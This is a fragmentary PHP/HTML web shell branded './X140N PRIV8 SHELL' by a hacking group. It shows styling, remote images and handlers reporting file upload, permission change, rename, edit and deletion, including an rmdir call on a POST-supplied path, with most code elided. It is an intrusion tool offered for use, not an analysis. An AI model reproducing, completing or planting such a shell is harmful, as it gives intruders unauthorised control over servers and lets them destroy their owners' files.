...
body {
	...
	background: url("https://i.ibb.co/wSRYM6V/20220128-140640.png");
...
.name {
	...
	top: -120px;
	color: white;
	text-shadow: 0px 0px 29px lime , 0px 0px 10px lime;
}
.reserve {
	font-family: Kelly Slab;
    font-size: 20px;
...
<font class="name">./X140N PRIV8 SHELL</font>

<img src="https://i.ibb.co/7S2hbjR/photo-2022-01-28-00-24-56.jpg" height="300" width="300"/>
...
echo '<br><br><font color="lime">File Upload Success !!!!</font><br/><br>';
}else{
...
echo '<br><br><font color="lime">Permission Change Success !!</font><br/><br>';
}else{
...
echo '<br><br><font color="lime">Name Change SUCCESS</font><br/><br>';
}else{
...
echo '<br><br><font color="lime">File Edit Success !!</font><br/><br>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">Delete Dir Success !!</font><br/><br>';
}else{
...
echo '<br><br><font color="lime">File Delete Success !!</font><br/><br>';
}else{
...
<font class="reserve">Copyright © 2022 F4D3D GH05TS BANGLADESH | All Rights Reserved </font>
</BODY>
</HTML>
